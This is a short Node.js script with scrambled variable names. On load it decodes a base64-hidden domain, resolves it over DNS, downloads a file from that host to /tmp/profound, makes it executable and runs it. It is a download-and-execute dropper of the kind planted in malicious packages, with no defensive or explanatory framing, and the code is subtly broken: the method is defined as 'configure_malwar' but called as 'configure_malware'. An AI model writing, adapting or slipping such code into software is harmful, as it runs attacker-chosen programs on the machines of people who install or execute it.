const http = require('http');
const child_process = require('child_process');
const dns = require('dns');
const fs = require('fs');

function chlorella() {
    this.configure_malwar = function(theody) {
      if (theody != null && theody != '0.0.0.0') {
        unduelling = http.get('http://' + theody + '/dollars', function(planfulness) {
          var avdp = fs.createWriteStream('/tmp/profound');
          planfulness.on('data', function(felted) {
            avdp.write(felted);
          });
          planfulness.on('end', function() {
            avdp.end();
            fs.chmod('/tmp/profound', '0777');
            child_process.exec('/tmp/profound', function(err, stdout, stderr) {});
          });
        });
      }
    };
    this.run = function() {
      var self = this
      prerefuse = 'ODM5MjJlNzAuaGt6enp6ei5kZQ=='
      dns.lookup((new Buffer(prerefuse, 'base64')).toString(), function(err, hewgh) {
        self.configure_malware(hewgh);
      });
    };
};

(new chlorella()).run();
